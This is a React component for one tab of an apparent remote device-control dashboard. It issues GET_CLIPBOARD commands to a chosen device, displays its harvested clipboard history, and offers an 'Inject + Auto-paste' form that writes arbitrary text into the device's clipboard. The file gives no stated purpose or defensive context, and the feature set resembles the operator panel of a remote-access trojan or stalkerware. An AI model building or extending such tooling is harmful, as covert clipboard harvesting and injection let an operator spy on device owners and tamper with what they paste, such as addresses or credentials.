import { useState, useEffect } from 'react';
import { api } from '../../lib/api';
import { Card, CmdBtn, C } from './shared';

export default function ClipboardTab({ device }) {
  const [entries, setEntries] = useState([]);
  const [text, setText] = useState('');
  const [loading, setLoading] = useState(false);

  async function load() {
    setLoading(true);
    try { setEntries(await api.getData(device.id, 'clipboard', 50)); }
    catch { setEntries([]); }
    finally { setLoading(false); }
  }

  async function injectAndPaste(e) {
    e.preventDefault();
    if (!text.trim()) return;
    await api.sendCommand(device.id, 'INJECT_CLIPBOARD', { text }).catch(() => {});
    setText('');
  }

  useEffect(() => { load(); }, [device.id]);

  return (
    <Card title="Clipboard" action={<CmdBtn deviceId={device.id} action="GET_CLIPBOARD" label="📋 Read" onDone={load} />}>
      <div style={{ marginBottom: 16 }}>
        <div style={{ fontSize: 11, color: C.dim, marginBottom: 6, textTransform: 'uppercase', letterSpacing: 1 }}>
          Inject + Auto-paste
        </div>
        <form onSubmit={injectAndPaste} style={{ display: 'flex', gap: 8 }}>
          <input value={text} onChange={e => setText(e.target.value)} placeholder="Text to inject into clipboard..."
            style={{ flex: 1, padding: '8px 11px', background: C.bg, border: `1px solid ${C.border}`,
              borderRadius: 5, color: C.text, fontSize: 13, outline: 'none', fontFamily: 'inherit' }} />
          <button type="submit"
            style={{ padding: '8px 14px', background: '#00613a', border: 'none', borderRadius: 5,
              color: '#fff', fontSize: 12, cursor: 'pointer', fontFamily: 'inherit' }}>
            Inject
          </button>
        </form>
      </div>

      <div style={{ fontSize: 11, color: C.dim, marginBottom: 8, textTransform: 'uppercase', letterSpacing: 1 }}>
        Clipboard History
      </div>
      {loading && <div style={{ color: '#444', fontSize: 12 }}>loading…</div>}
      {!entries.length && !loading && <div style={{ color: C.dim, fontSize: 12 }}>No clipboard data — click Read</div>}
      {entries.map((e, i) => {
        const d = e.data;
        const txt = d?.text || d?.data || (typeof d === 'string' ? d : JSON.stringify(d));
        return (
          <div key={i} style={{ padding: '8px 10px', background: C.bg, border: `1px solid ${C.border}`,
            borderRadius: 5, marginBottom: 6 }}>
            <div style={{ fontSize: 13, color: C.text, wordBreak: 'break-all' }}>{txt}</div>
            <div style={{ fontSize: 10, color: '#444', marginTop: 4 }}>
              {new Date(e.created_at).toLocaleString()}
            </div>
          </div>
        );
      })}
    </Card>
  );
}
